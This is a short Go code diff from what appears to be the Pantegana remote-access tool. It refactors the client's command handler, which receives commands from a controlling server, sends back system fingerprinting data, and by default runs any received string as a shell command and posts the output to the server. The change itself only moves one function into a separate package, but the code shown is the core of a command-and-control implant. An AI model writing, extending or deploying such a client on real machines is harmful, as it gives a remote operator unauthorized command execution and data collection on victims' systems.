@@ -4,6 +4,8 @@ import (
 	"log"
 	"os"
 	"strings"
+
+	"github.com/elleven11/pantegana/client/fingerprinter"
 )
 
 // Middleware executes the corresponding function from the command that the Pantegana server sent
@@ -32,7 +34,7 @@ func (c *Client) Middleware(cmd string) {
 		}
 	case "__sysinfo__":
 		log.Printf("[+] Sending system information...")
-		sysInfo := GetCurrentSysInfo()
+		sysInfo := fingerprinter.GetCurrentSysInfo()
 		c.SendSysInfo(c.BaseURL+sysInfoURL, sysInfo)
 	default: // Just execute the cmd as a system command (example: "ls /")
 		c.ExecAndGetOutput(c.BaseURL+cmdOutputURL, string(cmd))
